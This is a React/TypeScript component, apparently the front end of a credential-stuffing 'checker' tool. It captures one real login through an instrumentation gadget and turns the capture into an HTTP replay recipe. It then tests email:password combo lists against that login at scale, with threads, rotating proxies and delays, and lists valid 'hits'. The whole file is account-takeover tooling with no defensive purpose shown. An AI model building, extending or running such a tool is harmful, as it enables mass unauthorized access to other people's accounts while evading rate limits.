import { useCallback, useEffect, useState } from "react";
import {
  CaptureEvent,
  CheckerJobStatus,
  CheckerRecipe,
  fetchCaptureEvents,
  fetchCheckerJobStatus,
  fetchCheckerRecipe,
  setCaptureFilter,
  startCheckerJob,
  stopCheckerJob,
  suggestCheckerRecipe,
} from "./api";

export default function CheckerPanel() {
  const [urlFilter, setUrlFilter] = useState("auth|login|session|token");
  const [events, setEvents] = useState<CaptureEvent[]>([]);
  const [recipe, setRecipe] = useState<CheckerRecipe | null>(null);
  const [recipeJson, setRecipeJson] = useState("");
  const [combos, setCombos] = useState("");
  const [proxies, setProxies] = useState("");
  const [threads, setThreads] = useState(5);
  const [delayMs, setDelayMs] = useState(0);
  const [job, setJob] = useState<CheckerJobStatus | null>(null);

  const refreshEvents = useCallback(async () => {
    const ev = await fetchCaptureEvents(80);
    setEvents(ev);
  }, []);

  const refreshRecipe = useCallback(async () => {
    const r = await fetchCheckerRecipe();
    setRecipe(r);
    if (r) setRecipeJson(JSON.stringify(r, null, 2));
  }, []);

  useEffect(() => {
    refreshRecipe().catch(console.error);
    const t = setInterval(() => {
      refreshEvents().catch(console.error);
      fetchCheckerJobStatus().then(setJob).catch(console.error);
    }, 2500);
    return () => clearInterval(t);
  }, [refreshEvents, refreshRecipe]);

  const onApplyFilter = async () => {
    await setCaptureFilter(urlFilter);
    await refreshEvents();
  };

  const onBuildRecipe = async () => {
    const r = await suggestCheckerRecipe();
    setRecipe(r);
    setRecipeJson(JSON.stringify(r, null, 2));
  };

  const onSaveRecipe = async () => {
    const parsed = JSON.parse(recipeJson) as CheckerRecipe;
    await fetch("/api/checker/recipe", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(parsed),
    });
    setRecipe(parsed);
  };

  const onStart = async () => {
    const lines = combos.split("\n").map((l) => l.trim()).filter(Boolean);
    const proxyLines = proxies.split("\n").map((l) => l.trim()).filter(Boolean);
    const res = await startCheckerJob({
      combos: lines,
      threads,
      proxies: proxyLines,
      delay_ms: delayMs,
    });
    if (!res.ok) alert(res.error || "start failed");
    setJob(await fetchCheckerJobStatus());
  };

  return (
    <div className="checker-panel">
      <p style={{ fontSize: "0.85rem", color: "var(--muted)", marginTop: 0 }}>
        1) Enable <strong>Login Flow Capture</strong> in Actions → attach Gadget → perform one real login.
        2) Build recipe → tune JSON → run combos at scale via HTTP replay (no device per check).
      </p>

      <div className="checker-grid">
        <section>
          <h3>Capture filter</h3>
          <div style={{ display: "flex", gap: 8 }}>
            <input
              value={urlFilter}
              onChange={(e) => setUrlFilter(e.target.value)}
              style={{ flex: 1 }}
              placeholder="regex: auth|login|session"
            />
            <button type="button" className="btn" onClick={onApplyFilter}>
              Apply
            </button>
          </div>
          <h3 style={{ marginTop: 16 }}>Captured responses ({events.length})</h3>
          <div className="capture-list">
            {events.length === 0 && (
              <div className="muted">No traffic yet — login once with capture enabled.</div>
            )}
            {events.map((ev, i) => (
              <div key={i} className="capture-item">
                <div>
                  <span className="badge">{ev.method}</span> {ev.status ?? "—"}{" "}
                  <code style={{ fontSize: 11 }}>{ev.url}</code>
                </div>
              </div>
            ))}
          </div>
          <button type="button" className="btn primary" style={{ marginTop: 12 }} onClick={onBuildRecipe}>
            Build checker recipe from capture
          </button>
        </section>

        <section>
          <h3>Recipe (HTTP replay)</h3>
          {recipe && (
            <div className="muted" style={{ marginBottom: 8 }}>
              {recipe.base_url} · {recipe.steps?.length ?? 0} steps
            </div>
          )}
          <textarea
            className="recipe-editor"
            value={recipeJson}
            onChange={(e) => setRecipeJson(e.target.value)}
            spellCheck={false}
          />
          <button type="button" className="btn" onClick={onSaveRecipe}>
            Save recipe
          </button>
        </section>

        <section>
          <h3>Scale check</h3>
          <label className="muted">Combos (email:password per line)</label>
          <textarea
            className="combo-box"
            value={combos}
            onChange={(e) => setCombos(e.target.value)}
            placeholder="user@example.com:password123"
          />
          <label className="muted">Proxies (optional, one per line)</label>
          <textarea
            className="combo-box"
            style={{ minHeight: 48 }}
            value={proxies}
            onChange={(e) => setProxies(e.target.value)}
          />
          <div style={{ display: "flex", gap: 12, alignItems: "center", marginTop: 8 }}>
            <label>
              Threads
              <input
                type="number"
                min={1}
                max={50}
                value={threads}
                onChange={(e) => setThreads(Number(e.target.value))}
                style={{ width: 64, marginLeft: 6 }}
              />
            </label>
            <label>
              Delay ms
              <input
                type="number"
                min={0}
                value={delayMs}
                onChange={(e) => setDelayMs(Number(e.target.value))}
                style={{ width: 64, marginLeft: 6 }}
              />
            </label>
          </div>
          <div style={{ marginTop: 12, display: "flex", gap: 8 }}>
            <button type="button" className="btn primary" onClick={onStart} disabled={job?.running}>
              Start job
            </button>
            <button type="button" className="btn danger" onClick={() => stopCheckerJob()}>
              Stop
            </button>
          </div>
          {job && (
            <div className="job-stats">
              <div>
                {job.checked}/{job.total} · hits {job.hits} · bad {job.bad} · retry {job.retries}
              </div>
              {job.current && <div className="muted">Current: {job.current}</div>}
              <h4>Hits</h4>
              <pre className="hits-pre">
                {(job.hits_lines || []).join("\n") || "(none yet)"}
              </pre>
            </div>
          )}
        </section>
      </div>
    </div>
  );
}
